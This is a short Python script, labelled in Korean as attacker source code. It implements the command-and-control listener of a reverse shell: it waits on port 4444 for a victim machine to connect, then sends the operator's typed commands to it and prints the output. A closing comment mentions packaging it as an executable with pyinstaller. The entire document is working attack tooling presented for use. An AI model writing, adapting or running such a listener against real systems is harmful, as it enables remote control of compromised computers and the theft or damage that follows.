# 공격자 소스코드
import socket

def set_sock(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((ip, port))
    s.listen(1)
    conn, addr = s.accept()
    return conn, addr

def command(conn, addr):
    print("[+] Connected to", addr)
    while True:
        command = input(">")
        if command == "exit":
            conn.send(b"exit")
            conn.close()
            break
        elif command == "":
            print("Input Command...")
        else:
            conn.send(command.encode())
            output = conn.recv(65535)
            print(output.decode("euc-kr", "ignore"), end="")

if __name__ == '__main__':
    ip = "0.0.0.0" 
    port = 4444
    conn, addr = set_sock(ip, port)
    command(conn, addr)
    
# pyinstaller로 실행 파일 생성까지